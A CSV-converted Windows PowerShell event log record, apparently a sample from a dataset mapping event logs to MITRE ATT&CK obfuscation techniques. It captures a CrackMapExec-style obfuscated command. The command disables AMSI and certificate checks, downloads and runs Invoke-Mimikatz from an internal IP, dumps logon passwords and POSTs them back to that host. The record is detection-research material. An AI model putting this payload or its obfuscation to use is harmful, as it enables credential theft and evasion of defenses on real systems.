RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,1010,2021-04-30 20:32:08.8680152,600,Info,PowerShell,Windows PowerShell,0,0,win10-02.offsec.lan,0,,Provider is Started,,,"HostApplication=powershell.exe -exec bypass -noni -nop -w 1 -C &amp; ( $PshOMe[4]+$PshoME[30]+'X')(( (91 , 78,101 ,116 ,46, 83,101 , 114, 118 ,105,99, 101 , 80,111 ,105 , 110,116 ,77,97 , 110 , 97,103 ,101 ,114 , 93 ,58 ,58, 83, 101 , 114 ,118 ,101 , 114 , 67 ,101, 114 ,116 ,105,102 ,105,99 ,97 ,116, 101 , 86, 97 , 108,105, 100, 97,116 ,105 , 111,110 ,67 ,97, 108 , 108 ,98 , 97,99,107 , 32,61, 32 , 123,36, 116 ,114 , 117 ,101,125 ,10 , 116, 114 , 121, 123,10 ,91,82 ,101 , 102 , 93, 46,65 , 115 , 115 , 101,109 ,98 ,108,121 ,46 ,71 , 101, 116, 84,121 ,112 ,101, 40 ,39 , 83, 121, 115, 39, 43, 39,116 , 101 ,109,46, 77,97 , 110 , 39,43 , 39 ,97,103,101 ,109 ,101 , 110 , 116 ,46, 65, 117 , 116, 39 , 43,39,111 , 109 , 97,116,105,111, 110,46 , 65 ,109,39, 43 , 39,115 , 105 ,85 , 116, 39, 43 , 39,105 , 108 ,115 ,39 , 41,46 , 71,101,116 , 70,105 ,101, 108 , 100 , 40, 39, 97 , 109 , 39, 43, 39 ,115, 105,73, 110 , 105,39 , 43 , 39, 116,70,97,105 ,108,101 ,100 , 39,44, 32, 39,78 ,111 , 110 , 80,39 ,43, 39 ,117 ,98 , 108, 105 , 99 ,44,83 ,116 , 97,39,43, 39 , 116 , 105, 99 , 39, 41, 46 , 83 , 101, 116 ,86, 97, 108 ,117 , 101 , 40 ,36 ,110,117 , 108 ,108 ,44 , 32,36 , 116, 114,117, 101, 41,10 ,125 , 99 , 97,116, 99, 104 , 123 , 125, 10, 91, 78 , 101,116,46,83,101, 114 , 118, 105, 99,101,80,111 , 105 ,110 , 116, 77, 97,110 , 97, 103 , 101, 114, 93,58 ,58, 83, 101,114 , 118,101 , 114,67,101 ,114 ,116 ,105, 102,105 ,99, 97,116, 101 ,86 , 97 , 108 , 105 , 100, 97, 116, 105,111 ,110 , 67, 97,108, 108 ,98 , 97, 99 , 107, 32,61, 32 ,123 , 36 , 116 ,114, 117,101, 125, 10 , 91 , 83 , 121 ,115 , 116,101 ,109,46 , 78 , 101,116,46,83 , 101 , 114 , 118 , 105, 99,101, 80 , 111 , 105 , 110,116,77 ,97, 110, 97 , 103 ,101 ,114 ,93 ,58, 58,83 ,101,99 , 117, 114,105 ,116 , 121 , 80,114, 111 , 116,111 , 99 ,111 , 108 ,32 ,61, 32, 91 , 83 ,121 , 115 , 116, 101,109 , 46, 78,101 ,116 ,46 ,83,101 , 99, 117 , 114 ,105,116 , 121 ,80 ,114 , 111, 116, 111, 99, 111 ,108 , 84,121 , 112,101 , 93 ,39, 83,115, 108, 51 , 44 , 84 , 108 , 115,44 ,84 ,108 , 115, 49 ,49, 44,84, 108,115,49 ,50,39 , 10,73 , 69, 88 ,32 , 40 ,78 , 101,119, 45 , 79, 98,106, 101,99 , 116 , 32 ,78, 101 ,116, 46, 87 ,101 , 98 , 67 ,108 ,105 , 101 ,110, 116, 41,46 , 68, 111 , 119 ,110 , 108 ,111 , 97 , 100 , 83 , 116 ,114, 105,110, 103 , 40, 39 ,104 , 116,116,112,115 ,58 , 47,47 , 49, 48,46, 50,51, 46,49,50 , 51, 46, 49 , 49,58 ,52 , 52,51 ,47 ,73, 110,118 ,111,107 ,101,45,77,105 ,109, 105 ,107 , 97 , 116, 122 ,46 , 112 , 115,49,39,41,10,36 , 99, 109,100, 32 , 61 , 32, 73,110 ,118 , 111 , 107,101 ,45 ,77, 105, 109,105 ,107 , 97, 116 ,122 , 32 , 45 , 67,111 ,109,109, 97,110,100 , 32 ,39 ,112 , 114 , 105, 118 ,105, 108 ,101, 103 , 101,58,58, 100 ,101 , 98 ,117 , 103, 32 , 115, 101,107 ,117,114 , 108, 115 ,97, 58 ,58 ,108 ,111,103, 111 , 110,112 , 97,115, 115,119 ,111 ,114 ,100, 115 ,32 , 101 ,120, 105,116 ,39, 10, 36,114 ,101 , 113 , 117 , 101,115,116,32, 61,32 , 91,83 ,121 , 115, 116,101, 109 , 46 , 78 ,101 ,116,46 , 87 ,101,98 ,82 ,101,113, 117, 101 ,115,116, 93 , 58 ,58, 67, 114,101, 97,116 , 101 ,40, 39 ,104,116, 116 ,112 , 115,58,47 ,47 ,49, 48 ,46 ,50,51,46,49 ,50 , 51, 46, 49,49, 58,52 , 52, 51,47, 39 , 41,10, 36, 114,101 ,113,117 , 101,115, 116 , 46,77,101 ,116, 104, 111,100,32 , 61,32,39,80,79 , 83 , 84 , 39,10,36 ,114, 101, 113 ,117 , 101,115,116 ,46,67 ,111,110,116 , 101 ,110 ,116 , 84, 121, 112 ,101 ,32 ,61,32 , 39 ,97 , 112, 112 , 108 ,105 ,99 , 97 ,116, 105 ,111, 110, 47, 120, 45, 119 , 119 , 119 , 45 ,102 ,111 , 114 , 109 ,45,117,114,108, 101 , 110 ,99 ,111 ,100, 101,100 , 39 , 10, 36,98,121 ,116 , 101,115 , 32 , 61,32, 91,83,121,115 , 116 , 101 , 109, 46, 84 , 101 ,120, 116,46 ,69,110 ,99, 111,100 , 105, 110 , 103 ,93,58 , 58 ,65,83, 67,73, 73,46, 71 , 101 , 116, 66 ,121, 116, 101 ,115 , 40 , 36, 99, 109 ,100 , 41 , 10,36,114,101, 113,117, 101 , 115, 116 , 46 , 67,111 ,110 ,116, 101 ,110,116 , 76, 101 ,110 ,103 ,116 , 104 , 32 ,61 , 32, 36,98 , 121,116 , 101,115 , 46,76, 101, 110,103 , 116 , 104, 10,36 ,114 , 101 ,113 ,117, 101,115 ,116 , 83, 116,114,101 , 97 , 109, 32 ,61, 32, 36 ,114 ,101,113 ,117, 101 ,115 , 116,46 ,71,101 ,116 , 82, 101,113 , 117,101 , 115 ,116,83,116 ,114, 101, 97 , 109 , 40 , 41 , 10,36 , 114 ,101,113,117 ,101,115 , 116 ,83 , 116 ,114 ,101 ,97, 109 , 46 , 87, 114, 105, 116,101, 40 ,36 ,98, 121 ,116,101 , 115, 44,32 ,48 , 44, 32 , 36 ,98 , 121 ,116 ,101,115, 46 ,76,101, 110,103 , 116 ,104, 41, 10 , 36,114,101 ,113, 117, 101 , 115, 116 ,83 , 116 , 114 ,101 ,97 ,109 , 46, 67,108 ,111 , 115,101, 40 , 41 ,10 ,36,114 ,101,113 , 117,101,115 ,116 , 46, 71,101 ,116 ,82 ,101 ,115 , 112 ,111, 110,115 ,101 ,40 , 41 ) |fOrEACH-oBjeCT{ ([InT] $_-As [ChaR])}) -JoIn '' ) 
","HostName=ConsoleHost
","HostVersion=5.1.19041.906
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1027-Obfuscated Files or Information\ID400-800-CrackMapExec payload execution.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.906\n\tHostId=e0fe16a9-5eca-4050-9591-3a811a168d94\n\tHostApplication=powershell.exe -exec bypass -noni -nop -w 1 -C &amp; ( $PshOMe[4]+$PshoME[30]+'X')(( (91 , 78,101 ,116 ,46, 83,101 , 114, 118 ,105,99, 101 , 80,111 ,105 , 110,116 ,77,97 , 110 , 97,103 ,101 ,114 , 93 ,58 ,58, 83, 101 , 114 ,118 ,101 , 114 , 67 ,101, 114 ,116 ,105,102 ,105,99 ,97 ,116, 101 , 86, 97 , 108,105, 100, 97,116 ,105 , 111,110 ,67 ,97, 108 , 108 ,98 , 97,99,107 , 32,61, 32 , 123,36, 116 ,114 , 117 ,101,125 ,10 , 116, 114 , 121, 123,10 ,91,82 ,101 , 102 , 93, 46,65 , 115 , 115 , 101,109 ,98 ,108,121 ,46 ,71 , 101, 116, 84,121 ,112 ,101, 40 ,39 , 83, 121, 115, 39, 43, 39,116 , 101 ,109,46, 77,97 , 110 , 39,43 , 39 ,97,103,101 ,109 ,101 , 110 , 116 ,46, 65, 117 , 116, 39 , 43,39,111 , 109 , 97,116,105,111, 110,46 , 65 ,109,39, 43 , 39,115 , 105 ,85 , 116, 39, 43 , 39,105 , 108 ,115 ,39 , 41,46 , 71,101,116 , 70,105 ,101, 108 , 100 , 40, 39, 97 , 109 , 39, 43, 39 ,115, 105,73, 110 , 105,39 , 43 , 39, 116,70,97,105 ,108,101 ,100 , 39,44, 32, 39,78 ,111 , 110 , 80,39 ,43, 39 ,117 ,98 , 108, 105 , 99 ,44,83 ,116 , 97,39,43, 39 , 116 , 105, 99 , 39, 41, 46 , 83 , 101, 116 ,86, 97, 108 ,117 , 101 , 40 ,36 ,110,117 , 108 ,108 ,44 , 32,36 , 116, 114,117, 101, 41,10 ,125 , 99 , 97,116, 99, 104 , 123 , 125, 10, 91, 78 , 101,116,46,83,101, 114 , 118, 105, 99,101,80,111 , 105 ,110 , 116, 77, 97,110 , 97, 103 , 101, 114, 93,58 ,58, 83, 101,114 , 118,101 , 114,67,101 ,114 ,116 ,105, 102,105 ,99, 97,116, 101 ,86 , 97 , 108 , 105 , 100, 97, 116, 105,111 ,110 , 67, 97,108, 108 ,98 , 97, 99 , 107, 32,61, 32 ,123 , 36 , 116 ,114, 117,101, 125, 10 , 91 , 83 , 121 ,115 , 116,101 ,109,46 , 78 , 101,116,46,83 , 101 , 114 , 118 , 105, 99,101, 80 , 111 , 105 , 110,116,77 ,97, 110, 97 , 103 ,101 ,114 ,93 ,58, 58,83 ,101,99 , 117, 114,105 ,116 , 121 , 80,114, 111 , 116,111 , 99 ,111 , 108 ,32 ,61, 32, 91 , 83 ,121 , 115 , 116, 101,109 , 46, 78,101 ,116 ,46 ,83,101 , 99, 117 , 114 ,105,116 , 121 ,80 ,114 , 111, 116, 111, 99, 111 ,108 , 84,121 , 112,101 , 93 ,39, 83,115, 108, 51 , 44 , 84 , 108 , 115,44 ,84 ,108 , 115, 49 ,49, 44,84, 108,115,49 ,50,39 , 10,73 , 69, 88 ,32 , 40 ,78 , 101,119, 45 , 79, 98,106, 101,99 , 116 , 32 ,78, 101 ,116, 46, 87 ,101 , 98 , 67 ,108 ,105 , 101 ,110, 116, 41,46 , 68, 111 , 119 ,110 , 108 ,111 , 97 , 100 , 83 , 116 ,114, 105,110, 103 , 40, 39 ,104 , 116,116,112,115 ,58 , 47,47 , 49, 48,46, 50,51, 46,49,50 , 51, 46, 49 , 49,58 ,52 , 52,51 ,47 ,73, 110,118 ,111,107 ,101,45,77,105 ,109, 105 ,107 , 97 , 116, 122 ,46 , 112 , 115,49,39,41,10,36 , 99, 109,100, 32 , 61 , 32, 73,110 ,118 , 111 , 107,101 ,45 ,77, 105, 109,105 ,107 , 97, 116 ,122 , 32 , 45 , 67,111 ,109,109, 97,110,100 , 32 ,39 ,112 , 114 , 105, 118 ,105, 108 ,101, 103 , 101,58,58, 100 ,101 , 98 ,117 , 103, 32 , 115, 101,107 ,117,114 , 108, 115 ,97, 58 ,58 ,108 ,111,103, 111 , 110,112 , 97,115, 115,119 ,111 ,114 ,100, 115 ,32 , 101 ,120, 105,116 ,39, 10, 36,114 ,101 , 113 , 117 , 101,115,116,32, 61,32 , 91,83 ,121 , 115, 116,101, 109 , 46 , 78 ,101 ,116,46 , 87 ,101,98 ,82 ,101,113, 117, 101 ,115,116, 93 , 58 ,58, 67, 114,101, 97,116 , 101 ,40, 39 ,104,116, 116 ,112 , 115,58,47 ,47 ,49, 48 ,46 ,50,51,46,49 ,50 , 51, 46, 49,49, 58,52 , 52, 51,47, 39 , 41,10, 36, 114,101 ,113,117 , 101,115, 116 , 46,77,101 ,116, 104, 111,100,32 , 61,32,39,80,79 , 83 , 84 , 39,10,36 ,114, 101, 113 ,117 , 101,115,116 ,46,67 ,111,110,116 , 101 ,110 ,116 , 84, 121, 112 ,101 ,32 ,61,32 , 39 ,97 , 112, 112 , 108 ,105 ,99 , 97 ,116, 105 ,111, 110, 47, 120, 45, 119 , 119 , 119 , 45 ,102 ,111 , 114 , 109 ,45,117,114,108, 101 , 110 ,99 ,111 ,100, 101,100 , 39 , 10, 36,98,121 ,116 , 101,115 , 32 , 61,32, 91,83,121,115 , 116 , 101 , 109, 46, 84 , 101 ,120, 116,46 ,69,110 ,99, 111,100 , 105, 110 , 103 ,93,58 , 58 ,65,83, 67,73, 73,46, 71 , 101 , 116, 66 ,121, 116, 101 ,115 , 40 , 36, 99, 109 ,100 , 41 , 10,36,114,101, 113,117, 101 , 115, 116 , 46 , 67,111 ,110 ,116, 101 ,110,116 , 76, 101 ,110 ,103 ,116 , 104 , 32 ,61 , 32, 36,98 , 121,116 , 101,115 , 46,76, 101, 110,103 , 116 , 104, 10,36 ,114 , 101 ,113 ,117, 101,115 ,116 , 83, 116,114,101 , 97 , 109, 32 ,61, 32, 36 ,114 ,101,113 ,117, 101 ,115 , 116,46 ,71,101 ,116 , 82, 101,113 , 117,101 , 115 ,116,83,116 ,114, 101, 97 , 109 , 40 , 41 , 10,36 , 114 ,101,113,117 ,101,115 , 116 ,83 , 116 ,114 ,101 ,97, 109 , 46 , 87, 114, 105, 116,101, 40 ,36 ,98, 121 ,116,101 , 115, 44,32 ,48 , 44, 32 , 36 ,98 , 121 ,116 ,101,115, 46 ,76,101, 110,103 , 116 ,104, 41, 10 , 36,114,101 ,113, 117, 101 , 115, 116 ,83 , 116 , 114 ,101 ,97 ,109 , 46, 67,108 ,111 , 115,101, 40 , 41 ,10 ,36,114 ,101,113 , 117,101,115 ,116 , 46, 71,101 ,116 ,82 ,101 ,115 , 112 ,111, 110,115 ,101 ,40 , 41 ) |fOrEACH-oBjeCT{ ([InT] $_-As [ChaR])}) -JoIn '' ) \n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
